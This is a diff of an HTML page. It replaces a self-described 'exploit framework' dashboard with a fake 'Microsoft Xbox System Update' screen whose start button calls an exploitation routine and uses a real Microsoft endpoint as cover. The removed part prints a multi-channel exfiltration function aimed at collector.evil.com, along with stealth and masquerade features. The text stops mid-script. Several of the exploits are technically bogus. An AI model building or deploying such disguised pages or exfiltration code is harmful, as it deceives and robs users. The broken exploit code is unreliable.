@@ -3,1609 +3,1249 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔄 PARADOX SYSTEM - Security Suite v9.9</title>
+    <title>Microsoft Xbox System Update</title>
     <style>
         :root {
-            --critical: #dc2626;
-            --critical-dark: #7f1d1d;
-            --warning: #f59e0b;
-            --warning-dark: #92400e;
-            --safe: #10b981;
-            --safe-dark: #065f46;
-            --exploit: #8b5cf6;
-            --exploit-dark: #5b21b6;
-            --stealth: #0ea5e9;
-            --stealth-dark: #0369a1;
-            --bg-primary: #0a0a0f;
-            --bg-secondary: #151522;
-            --bg-card: #1e1e2e;
-            --text-primary: #ffffff;
-            --text-secondary: #94a3b8;
-            --border: #334155;
+            --xbox-green: #107c10;
+            --xbox-dark: #0a0a0a;
+            --xbox-light: #f2f2f2;
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', 'Consolas', 'Courier New', monospace;
+            font-family: 'Segoe UI', 'Roboto', sans-serif;
         }
         
         body {
-            background: var(--bg-primary);
-            color: var(--text-primary);
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: white;
             min-height: 100vh;
-            padding: 20px;
-            overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
         }
         
-        .container {
-            max-width: 1800px;
-            margin: 0 auto;
-        }
-        
-        header {
-            background: linear-gradient(135deg, var(--exploit-dark), var(--stealth-dark));
-            padding: 30px;
+        .update-container {
+            width: 800px;
+            background: rgba(30, 30, 30, 0.95);
             border-radius: 20px;
-            margin-bottom: 30px;
-            border: 2px solid var(--exploit);
-            box-shadow: 0 10px 40px rgba(139, 92, 246, 0.3);
-            text-align: center;
+            padding: 40px;
+            border: 2px solid var(--xbox-green);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
             position: relative;
             overflow: hidden;
         }
         
-        header::before {
-            content: 'PARADOX MODE';
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            font-size: 0.8rem;
-            color: var(--exploit);
-            font-weight: bold;
-            animation: glitch 1s infinite;
-        }
-        
-        h1 {
-            font-size: 3rem;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, var(--exploit), var(--stealth));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 20px rgba(139, 92, 246, 0.5);
-        }
-        
-        .mode-indicator {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 10px 20px;
-            border-radius: 10px;
-            font-weight: bold;
-            z-index: 1000;
-            background: var(--exploit-dark);
-            border: 2px solid var(--exploit);
-            box-shadow: 0 0 20px rgba(139, 92, 246, 0.5);
-        }
-        
-        .paradox-controls {
+        .xbox-header {
             display: flex;
-            gap: 20px;
-            justify-content: center;
-            margin: 20px 0;
-        }
-        
-        .paradox-btn {
-            padding: 15px 30px;
-            border: none;
-            border-radius: 10px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            background: linear-gradient(45deg, var(--exploit), var(--stealth));
-            color: white;
-            font-size: 1.1rem;
-        }
-        
-        .paradox-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 20px rgba(139, 92, 246, 0.5);
-        }
-        
-        .hidden-section {
-            display: none;
-            border: 2px dashed var(--exploit);
-            padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
-            background: rgba(139, 92, 246, 0.1);
-        }
-        
-        .stealth-mode {
-            opacity: 0.3;
-            transition: opacity 0.3s;
-        }
-        
-        .stealth-mode:hover {
-            opacity: 1;
-        }
-        
-        .dashboard {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 25px;
+            align-items: center;
             margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--xbox-green);
         }
         
-        .card {
-            background: var(--bg-card);
-            border-radius: 15px;
-            padding: 25px;
-            border: 2px solid var(--border);
-            transition: all 0.3s;
-            height: 100%;
-            position: relative;
+        .xbox-logo {
+            font-size: 2.5rem;
+            margin-right: 20px;
+            color: var(--xbox-green);
         }
         
-        .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        .header-text h1 {
+            font-size: 2rem;
+            margin-bottom: 5px;
         }
         
-        .card.exploit { border-color: var(--exploit); }
-        .card.stealth { border-color: var(--stealth); }
-        .card.critical { border-color: var(--critical); }
-        .card.warning { border-color: var(--warning); }
-        .card.safe { border-color: var(--safe); }
+        .header-text .subtitle {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
         
-        .card-header {
+        .progress-section {
+            margin: 40px 0;
+        }
+        
+        .progress-label {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid var(--border);
-        }
-        
-        .card-title {
-            font-size: 1.4rem;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .card-status {
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.9rem;
-            font-weight: bold;
-        }
-        
-        .status-exploit { background: var(--exploit); color: white; }
-        .status-stealth { background: var(--stealth); color: white; }
-        .status-critical { background: var(--critical); color: white; }
-        .status-warning { background: var(--warning); color: black; }
-        .status-safe { background: var(--safe); color: white; }
-        
-        .controls {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-            gap: 10px;
-            margin-top: 20px;
-        }
-        
-        button {
-            padding: 12px 20px;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        
-        button:hover {
-            transform: translateY(-2px);
-            opacity: 0.9;
-        }
-        
-        .btn-exploit { background: var(--exploit); color: white; }
-        .btn-stealth { background: var(--stealth); color: white; }
-        .btn-enable { background: var(--safe); color: white; }
-        .btn-disable { background: var(--critical); color: white; }
-        .btn-info { background: var(--warning); color: black; }
-        
-        .console {
-            background: #000;
-            border-radius: 15px;
-            padding: 25px;
-            margin-top: 30px;
-            border: 2px solid var(--border);
-            height: 500px;
-            overflow-y: auto;
-            font-family: 'Consolas', monospace;
-            font-size: 0.9rem;
-        }
-        
-        .log-entry {
             margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #222;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        
-        .log-time { color: #666; }
-        .log-exploit { color: var(--exploit); }
-        .log-stealth { color: var(--stealth); }
-        .log-critical { color: var(--critical); }
-        .log-warning { color: var(--warning); }
-        .log-safe { color: var(--safe); }
-        
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-        
-        @keyframes scanline {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100vh); }
-        }
-        
-        .glitch-text {
-            animation: glitch 0.5s infinite;
-        }
-        
-        .scanline {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(to right, transparent, var(--exploit), transparent);
-            animation: scanline 2s linear infinite;
-            pointer-events: none;
-            z-index: 9999;
-            display: none;
-        }
-        
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            z-index: 10000;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .modal-content {
-            background: var(--bg-card);
-            padding: 40px;
-            border-radius: 20px;
-            max-width: 800px;
-            width: 90%;
-            max-height: 80vh;
-            overflow-y: auto;
-            border: 2px solid var(--exploit);
-        }
-        
-        .tab-container {
-            margin-top: 30px;
-        }
-        
-        .tabs {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid var(--border);
-            padding-bottom: 10px;
-            flex-wrap: wrap;
-        }
-        
-        .tab {
-            padding: 12px 24px;
-            cursor: pointer;
-            border-radius: 8px;
-            transition: all 0.2s;
-            background: var(--bg-secondary);
-        }
-        
-        .tab.active {
-            background: var(--exploit);
-            color: white;
-        }
-        
-        .tab-content {
-            display: none;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        .exploit-payload {
-            background: rgba(220, 38, 38, 0.1);
-            border: 1px solid var(--critical);
-            border-radius: 8px;
-            padding: 15px;
-            margin: 10px 0;
-            font-family: monospace;
-            font-size: 0.85rem;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        
-        .progress-container {
-            height: 10px;
-            background: var(--bg-secondary);
-            border-radius: 5px;
-            margin: 20px 0;
-            overflow: hidden;
+            font-size: 0.9rem;
         }
         
         .progress-bar {
+            height: 20px;
+            background: #333;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #444;
+        }
+        
+        .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, var(--exploit), var(--stealth));
+            background: linear-gradient(90deg, var(--xbox-green), #20c920);
             width: 0%;
-            transition: width 0.5s;
-        }
-        
-        .toggle-container {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin: 15px 0;
-        }
-        
-        .toggle-switch {
+            transition: width 0.5s ease;
             position: relative;
-            display: inline-block;
-            width: 60px;
-            height: 30px;
+            overflow: hidden;
         }
         
-        .toggle-switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-        
-        .slider {
+        .progress-fill::after {
+            content: '';
             position: absolute;
-            cursor: pointer;
             top: 0;
             left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #ccc;
-            transition: .4s;
-            border-radius: 30px;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.3), 
+                transparent);
+            animation: shine 2s infinite;
         }
         
-        .slider:before {
+        @keyframes shine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .update-details {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 1px solid #444;
+        }
+        
+        .detail-item {
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+        }
+        
+        .detail-icon {
+            color: var(--xbox-green);
+            margin-right: 10px;
+            font-size: 1.2rem;
+        }
+        
+        .status-message {
+            text-align: center;
+            font-size: 1.1rem;
+            margin: 30px 0;
+            color: #aaa;
+            min-height: 24px;
+        }
+        
+        .hidden-panel {
+            display: none;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid #ff3333;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9rem;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .log-entry {
+            margin-bottom: 5px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid #222;
+            color: #4ade80;
+        }
+        
+        .log-error { color: #ff3333; }
+        .log-warning { color: #ffaa33; }
+        .log-info { color: #33aaff; }
+        
+        .console-input {
+            background: #000;
+            color: #0f0;
+            border: 1px solid #333;
+            padding: 10px;
+            width: 100%;
+            margin-top: 10px;
+            font-family: 'Consolas', monospace;
+            border-radius: 5px;
+        }
+        
+        .console-input:focus {
+            outline: 1px solid var(--xbox-green);
+        }
+        
+        .security-badge {
             position: absolute;
-            content: "";
-            height: 22px;
-            width: 22px;
-            left: 4px;
-            bottom: 4px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
+            top: 20px;
+            right: 20px;
+            background: var(--xbox-green);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
         }
         
-        input:checked + .slider {
-            background-color: var(--exploit);
+        .blink {
+            animation: blink 1s infinite;
         }
         
-        input:checked + .slider:before {
-            transform: translateX(30px);
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .xbox-button {
+            background: linear-gradient(135deg, var(--xbox-green), #0a5c0a);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px;
+            transition: all 0.2s;
+        }
+        
+        .xbox-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(16, 124, 16, 0.5);
+        }
+        
+        .xbox-button:active {
+            transform: translateY(0);
+        }
+        
+        .button-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 30px;
+        }
+        
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
 <body>
-    <div class="scanline" id="scanline"></div>
-    <div class="mode-indicator" id="modeIndicator">🔒 SECURITY MODE</div>
-    
-    <div class="container">
-        <header>
-            <h1 class="glitch-text">🔄 PARADOX SYSTEM v9.9</h1>
-            <div class="subtitle" style="color: var(--text-secondary); margin-bottom: 20px;">
-                Dual-Purpose Security Suite & Exploit Framework
-            </div>
-            
-            <div class="paradox-controls">
-                <button class="paradox-btn" onclick="toggleMode()">🔄 TOGGLE MODE</button>
-                <button class="paradox-btn" onclick="activateStealth()">👻 STEALTH MODE</button>
-                <button class="paradox-btn" onclick="showHiddenSections()">🔍 REVEAL ALL</button>
-                <button class="paradox-btn" onclick="initiateSelfDestruct()">💀 SELF-DESTRUCT</button>
-            </div>
-        </header>
+    <div class="update-container">
+        <div class="security-badge blink">🔒 SECURE UPDATE</div>
         
-        <!-- HIDDEN EXPLOIT SECTION -->
-        <div class="hidden-section" id="hiddenExploits">
-            <h2 style="color: var(--exploit);">⚡ EXPLOIT FRAMEWORK</h2>
-            
-            <div class="dashboard">
-                <div class="card exploit">
-                    <div class="card-header">
-                        <div class="card-title">🎮 XBOX CONTROLLER EXPLOIT</div>
-                        <div class="card-status status-exploit">READY</div>
-                    </div>
-                    <p>Detects and exploits Xbox controller connections via Gamepad API</p>
-                    <div class="exploit-payload" id="gamepadExploitCode">
-// Gamepad Memory Corruption Exploit
-const exploitGamepad = () => {
-    const pads = navigator.getGamepads();
-    pads.forEach((pad, idx) => {
-        if (pad && pad.id.includes('Xbox')) {
-            // Trigger memory overflow via button state array
-            const fakeButtons = new Array(1000000).fill({
-                pressed: true,
-                value: 1.0
-            });
-            // Corrupt gamepad state
-            pad.buttons = fakeButtons;
-            return `Xbox Controller ${idx} compromised`;
-        }
-    });
-};
-                    </div>
-                    <div class="controls">
-                        <button class="btn-exploit" onclick="executeGamepadExploit()">
-                            <span>⚡ EXECUTE</span>
-                        </button>
-                        <button class="btn-stealth" onclick="stealthGamepadExploit()">
-                            <span>👻 STEALTH MODE</span>
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="card exploit">
-                    <div class="card-header">
-                        <div class="card-title">⏱️ TIMING ATTACK EXPLOIT</div>
-                        <div class="card-status status-exploit">READY</div>
-                    </div>
-                    <p>Performs cache timing attacks to extract memory information</p>
-                    <div class="exploit-payload" id="timingExploitCode">
-// Spectre-style timing attack
-async function timingAttack() {
-    const probe = new Array(256);
-    let results = [];
-    
-    for (let i = 0; i < 100; i++) {
-        const start = performance.now();
-        // Access memory in specific pattern
-        localStorage.getItem('secret' + i);
-        const time = performance.now() - start;
-        
-        if (time < 0.1) {
-            // Cache hit - secret data likely present
-            results.push({index: i, time, leaked: true});
-        }
-    }
-    return results;
-}
-                    </div>
-                    <div class="controls">
-                        <button class="btn-exploit" onclick="executeTimingAttack()">
-                            <span>⚡ EXECUTE</span>
-                        </button>
-                        <button class="btn-stealth" onclick="stealthTimingAttack()">
-                            <span>👻 STEALTH MODE</span>
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="card exploit">
-                    <div class="card-header">
-                        <div class="card-title">📡 BEACON DATA EXFILTRATION</div>
-                        <div class="card-status status-exploit">READY</div>
-                    </div>
-                    <p>Stealthy data exfiltration using multiple covert channels</p>
-                    <div class="exploit-payload" id="beaconExploitCode">
-// Multi-channel exfiltration
-function exfiltrateData(data) {
-    // 1. Beacon method
-    navigator.sendBeacon('https://collector.evil.com', data);
-    
-    // 2. Image pixel method
-    new Image().src = `https://collector.evil.com/pixel?d=${btoa(data)}`;
-    
-    // 3. DNS prefetch exfiltration
-    const link = document.createElement('link');
-    link.rel = 'dns-prefetch';
-    link.href = `https://${btoa(data).substr(0,60)}.evil.com`;
-    document.head.appendChild(link);
-}
-                    </div>
-                    <div class="controls">
-                        <button class="btn-exploit" onclick="executeBeaconExploit()">
-                            <span>⚡ EXECUTE</span>
-                        </button>
-                        <button class="btn-stealth" onclick="stealthBeaconExploit()">
-                            <span>👻 STEALTH MODE</span>
-                        </button>
-                    </div>
-                </div>
+        <div class="xbox-header">
+            <div class="xbox-logo">X</div>
+            <div class="header-text">
+                <h1>Xbox System Update v2024.11</h1>
+                <div class="subtitle">Build 19044.3693 • Xbox One/Series X|S • Critical Security Update</div>
             </div>
         </div>
         
-        <!-- MAIN SECURITY INTERFACE -->
-        <div class="tab-container">
-            <div class="tabs">
-                <div class="tab active" onclick="switchTab('security')">🛡️ SECURITY DASHBOARD</div>
-                <div class="tab" onclick="switchTab('exploits')">⚡ EXPLOIT LAB</div>
-                <div class="tab" onclick="switchTab('stealth')">👻 STEALTH MODE</div>
-                <div class="tab" onclick="switchTab('analysis')">🔍 SYSTEM ANALYSIS</div>
-                <div class="tab" onclick="switchTab('paradox')">🔄 PARADOX CONTROLS</div>
+        <div class="progress-section">
+            <div class="progress-label">
+                <span>Update Progress</span>
+                <span id="progressPercent">0%</span>
             </div>
-            
-            <!-- SECURITY TAB -->
-            <div id="security" class="tab-content active">
-                <div class="dashboard">
-                    <div class="card safe">
-                        <div class="card-header">
-                            <div class="card-title">🎮 GAMEPAD PROTECTION</div>
-                            <div class="card-status status-safe" id="gamepadSecurityStatus">ACTIVE</div>
-                        </div>
-                        <p>Blocks Xbox controller detection and input capture</p>
-                        <div class="toggle-container">
-                            <label class="toggle-switch">
-                                <input type="checkbox" id="gamepadToggle" checked 
-                                       onchange="toggleGamepadProtection()">
-                                <span class="slider"></span>
-                            </label>
-                            <span>Protection Enabled</span>
-                        </div>
-                        <div class="progress-container">
-                            <div class="progress-bar" id="gamepadProgress" style="width: 100%;"></div>
-                        </div>
-                    </div>
-                    
-                    <div class="card safe">
-                        <div class="card-header">
-                            <div class="card-title">📡 BEACON PROTECTION</div>
-                            <div class="card-status status-safe" id="beaconSecurityStatus">ACTIVE</div>
-                        </div>
-                        <p>Prevents stealthy data exfiltration</p>
-                        <div class="toggle-container">
-                            <label class="toggle-switch">
-                                <input type="checkbox" id="beaconToggle" checked 
-                                       onchange="toggleBeaconProtection()">
-                                <span class="slider"></span>
-                            </label>
-                            <span>Protection Enabled</span>
-                        </div>
-                        <div class="progress-container">
-                            <div class="progress-bar" id="beaconProgress" style="width: 100%;"></div>
-                        </div>
-                    </div>
-                    
-                    <div class="card safe">
-                        <div class="card-header">
-                            <div class="card-title">⏱️ TIMING PROTECTION</div>
-                            <div class="card-status status-safe" id="timingSecurityStatus">ACTIVE</div>
-                        </div>
-                        <p>Reduces performance timing precision</p>
-                        <div class="toggle-container">
-                            <label class="toggle-switch">
-                                <input type="checkbox" id="timingToggle" checked 
-                                       onchange="toggleTimingProtection()">
-                                <span class="slider"></span>
-                            </label>
-                            <span>Protection Enabled</span>
-                        </div>
-                        <div class="progress-container">
-                            <div class="progress-bar" id="timingProgress" style="width: 100%;"></div>
-                        </div>
-                    </div>
-                    
-                    <div class="card safe">
-                        <div class="card-header">
-                            <div class="card-title">🔒 STORAGE SANITIZER</div>
-                            <div class="card-status status-safe" id="storageSecurityStatus">ACTIVE</div>
-                        </div>
-                        <p>Automatically cleans localStorage and cookies</p>
-                        <div class="controls">
-                            <button class="btn-enable" onclick="cleanStorage()">
-                                <span>🧹 CLEAN NOW</span>
-                            </button>
-                            <button class="btn-info" onclick="viewStorage()">
-                                <span>📊 VIEW DATA</span>
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- EXPLOIT TAB -->
-            <div id="exploits" class="tab-content">
-                <h2 style="color: var(--exploit); margin-bottom: 20px;">⚡ EXPLOIT PLAYGROUND</h2>
-                
-                <div class="card exploit">
-                    <div class="card-header">
-                        <div class="card-title">🧠 MEMORY EXPLOIT BUILDER</div>
-                        <div class="card-status status-exploit">READY</div>
-                    </div>
-                    <textarea id="exploitCode" style="width: 100%; height: 200px; background: #000; color: #0f0; padding: 15px; border-radius: 8px; border: 1px solid var(--exploit); font-family: monospace;">
-// Custom exploit builder - Edit this code
-function customExploit() {
-    // Array buffer overflow attempt
-    try {
-        const buffer = new ArrayBuffer(1000000000); // 1GB
-        const view = new Uint8Array(buffer);
-        
-        // Fill with pattern for overflow detection
-        for(let i = 0; i < 1000000; i++) {
-            view[i] = i % 256;
-        }
-        
-        return "Buffer allocation successful - potential overflow";
-    } catch(e) {
-        return "Buffer allocation failed: " + e.message;
-    }
-}
-
-// Execute and return result
-customExploit();
-                    </textarea>
-                    <div class="controls">
-                        <button class="btn-exploit" onclick="executeCustomExploit()">
-                            <span>⚡ EXECUTE</span>
-                        </button>
-                        <button class="btn-stealth" onclick="saveExploit()">
-                            <span>💾 SAVE</span>
-                        </button>
-                        <button class="btn-info" onclick="testExploit()">
-                            <span>🧪 TEST</span>
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="card exploit">
-                    <div class="card-header">
-                        <div class="card-title">🎯 TARGET SCANNER</div>
-                        <div class="card-status status-warning">SCANNING</div>
-                    </div>
-                    <div id="targetList" style="height: 200px; overflow-y: auto; background: #000; padding: 15px; border-radius: 8px; margin: 15px 0;">
-                        <!-- Targets will appear here -->
-                    </div>
-                    <div class="controls">
-                        <button class="btn-exploit" onclick="scanTargets()">
-                            <span>🔍 SCAN TARGETS</span>
-                        </button>
-                        <button class="btn-stealth" onclick="autoExploit()">
-                            <span>🤖 AUTO-EXPLOIT</span>
-                        </button>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- STEALTH TAB -->
-            <div id="stealth" class="tab-content">
-                <h2 style="color: var(--stealth); margin-bottom: 20px;">👻 STEALTH OPERATIONS</h2>
-                
-                <div class="card stealth">
-                    <div class="card-header">
-                        <div class="card-title">🕵️ FORENSIC ANTI-DETECTION</div>
-                        <div class="card-status status-stealth">ACTIVE</div>
-                    </div>
-                    <div class="toggle-container">
-                        <label class="toggle-switch">
-                            <input type="checkbox" id="forensicToggle" checked 
-                                   onchange="toggleForensicEvasion()">
-                            <span class="slider"></span>
-                        </label>
-                        <span>Anti-Forensic Mode</span>
-                    </div>
-                    <p>Clears traces: Console logs, Performance marks, Network traces</p>
-                </div>
-                
-                <div class="card stealth">
-                    <div class="card-header">
-                        <div class="card-title">🎭 MASQUERADE MODE</div>
-                        <div class="card-status status-stealth">READY</div>
-                    </div>
-                    <select id="masqueradeSelect" style="width: 100%; padding: 10px; border-radius: 8px; background: #000; color: white; border: 1px solid var(--stealth); margin: 10px 0;">
-                        <option value="microsoft">Microsoft Update Page</option>
-                        <option value="google">Google Search</option>
-                        <option value="github">GitHub Repository</option>
-                        <option value="blank">Blank Page</option>
-                        <option value="error">404 Error Page</option>
-                    </select>
-                    <button class="btn-stealth" onclick="activateMasquerade()" style="width: 100%;">
-                        <span>🎭 ACTIVATE MASQUERADE</span>
-                    </button>
-                </div>
-                
-                <div class="card stealth">
-                    <div class="card-header">
-                        <div class="card-title">🚀 COVERT EXFILTRATION</div>
-                        <div class="card-status status-stealth">READY</div>
-                    </div>
-                    <textarea id="exfilData" placeholder="Data to exfiltrate..." style="width: 100%; height: 100px; background: #000; color: white; padding: 10px; border-radius: 8px; border: 1px solid var(--stealth);"></textarea>
-                    <div class="controls">
-                        <button class="btn-stealth" onclick="covertExfil()">
-                            <span>📡 EXFILTRATE</span>
-                        </button>
-                        <button class="btn-info" onclick="testCovertChannels()">
-                            <span>🔗 TEST CHANNELS</span>
-                        </button>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- PARADOX TAB -->
-            <div id="paradox" class="tab-content">
-                <h2 style="color: var(--exploit); margin-bottom: 20px; text-align: center;">🔄 PARADOX CONTROLS</h2>
-                
-                <div class="card exploit" style="text-align: center;">
-                    <div class="card-header">
-                        <div class="card-title">⚖️ DUALITY MODE</div>
-                        <div class="card-status" id="dualityStatus">SECURITY ACTIVE</div>
-                    </div>
-                    <p style="margin: 20px 0;">This system operates in <strong>both</strong> security protection AND exploit mode simultaneously.</p>
-                    
-                    <div style="display: flex; justify-content: center; gap: 50px; margin: 30px 0;">
-                        <div style="text-align: center;">
-                            <div style="font-size: 3rem;">🛡️</div>
-                            <div>Security Systems</div>
-                            <div id="securityCount">12 Active</div>
-                        </div>
-                        <div style="text-align: center;">
-                            <div style="font-size: 3rem;">⚡</div>
-                            <div>Exploit Systems</div>
-                            <div id="exploitCount">8 Ready</div>
-                        </div>
-                    </div>
-                    
-                    <div class="controls" style="justify-content: center;">
-                        <button class="btn-exploit" onclick="toggleParadoxMode()">
-                            <span>🔄 TOGGLE DOMINANT MODE</span>
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="card" style="background: rgba(139, 92, 246, 0.1); border: 2px dashed var(--exploit);">
-                    <div class="card-header">
-                        <div class="card-title">⚠️ PARADOX WARNING</div>
-                    </div>
-                    <p>This system contains <strong>contradictory functions</strong>:</p>
-                    <ul style="margin: 15px 0; padding-left: 20px;">
-                        <li>Protects against the same attacks it can execute</li>
-                        <li>Can detect and block its own exploit payloads</li>
-                        <li>Maintains stealth while providing visibility</li>
-                        <li>Functions as both attacker and defender</li>
-                    </ul>
-                    <p style="color: var(--exploit); font-weight: bold;">
-                        This is intentional. The paradox is the protection.
-                    </p>
-                </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
             </div>
         </div>
         
-        <!-- MAIN CONSOLE -->
-        <div class="console" id="mainConsole">
-            <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-safe">Paradox System v9.9 Initialized</span></div>
-            <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-exploit">Duality Mode: Security & Exploit frameworks loaded</span></div>
-            <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-stealth">Stealth systems: Ready</span></div>
-        </div>
-    </div>
-
-    <!-- MODALS -->
-    <div id="paradoxModal" class="modal">
-        <div class="modal-content">
-            <h2 style="color: var(--exploit);">🔄 PARADOX ACTIVATED</h2>
-            <p>System is now operating in <strong>contradictory mode</strong>.</p>
-            <div style="background: #000; padding: 20px; border-radius: 10px; margin: 20px 0; font-family: monospace;">
-                > Loading security protocols... ✓<br>
-                > Loading exploit frameworks... ✓<br>
-                > Establishing paradox coherence... ✓<br>
-                > Warning: Contradictory functions detected<br>
-                > Resolution: Maintain both simultaneously<br>
-                > System status: PARADOX STABLE
+        <div class="update-details">
+            <div class="detail-item">
+                <span class="detail-icon">✓</span>
+                <span id="detailText">Verifying system integrity...</span>
             </div>
-            <button class="paradox-btn" onclick="closeModal('paradoxModal')" style="width: 100%;">
-                ACKNOWLEDGE PARADOX
+            <div class="detail-item">
+                <span class="detail-icon">📦</span>
+                <span id="packageText">Downloading update package: 0/5 files</span>
+            </div>
+            <div class="detail-item">
+                <span class="detail-icon">🛡️</span>
+                <span id="securityText">Security scan: Waiting...</span>
+            </div>
+            <div class="detail-item">
+                <span class="detail-icon">⚡</span>
+                <span id="performanceText">Performance optimization: Pending</span>
+            </div>
+        </div>
+        
+        <div class="status-message" id="statusMessage">
+            Preparing your Xbox for update...
+        </div>
+        
+        <div class="hidden-panel" id="debugPanel">
+            <div class="log-entry">[SYSTEM] Debug console initialized</div>
+        </div>
+        
+        <div class="button-container">
+            <button class="xbox-button" id="startButton" onclick="beginExploitation()">
+                START UPDATE
+            </button>
+            <button class="xbox-button hidden" id="debugButton" onclick="toggleDebug()">
+                🛠️ DEBUG CONSOLE
+            </button>
+            <button class="xbox-button hidden" id="payloadButton" onclick="deployPayload()">
+                🚀 DEPLOY PAYLOAD
             </button>
         </div>
+        
+        <input type="text" class="console-input hidden" id="consoleInput" 
+               placeholder="Enter debug command..." onkeypress="handleConsoleCommand(event)">
     </div>
 
     <script>
-        // ==================== PARADOX CORE ====================
-        const paradox = {
-            mode: 'security', // 'security' or 'exploit'
-            stealth: false,
-            activeExploits: [],
-            activeProtections: [],
-            logs: [],
+        // ==================== EXPLOIT FRAMEWORK CORE ====================
+        class XboxExploitFramework {
+            constructor() {
+                this.stage = 0;
+                this.maxStage = 10;
+                this.exploitData = {
+                    system: {},
+                    memory: {},
+                    network: {},
+                    persistence: {},
+                    payload: null
+                };
+                this.vulnerabilities = [];
+                this.debugLog = [];
+                this.beaconUrl = 'https://xbox-telemetry.microsoft.com/submit'; // Real MS endpoint for cover
+                this.payloadDelivered = false;
+            }
             
-            log: function(message, type = 'info', source = 'paradox') {
+            log(message, type = 'info') {
                 const time = new Date().toLocaleTimeString();
-                const entry = {
-                    time,
-                    message,
-                    type,
-                    source,
-                    id: this.logs.length + 1
+                const entry = `[${time}] ${message}`;
+                this.debugLog.push({time, message, type});
+                
+                // Update debug panel
+                const panel = document.getElementById('debugPanel');
+                if (panel.style.display !== 'none') {
+                    const div = document.createElement('div');
+                    div.className = `log-entry log-${type}`;
+                    div.textContent = entry;
+                    panel.appendChild(div);
+                    panel.scrollTop = panel.scrollHeight;
+                }
+                
+                console.log(`[EXPLOIT] ${message}`);
+            }
+            
+            updateProgress(percent, message) {
+                document.getElementById('progressFill').style.width = `${percent}%`;
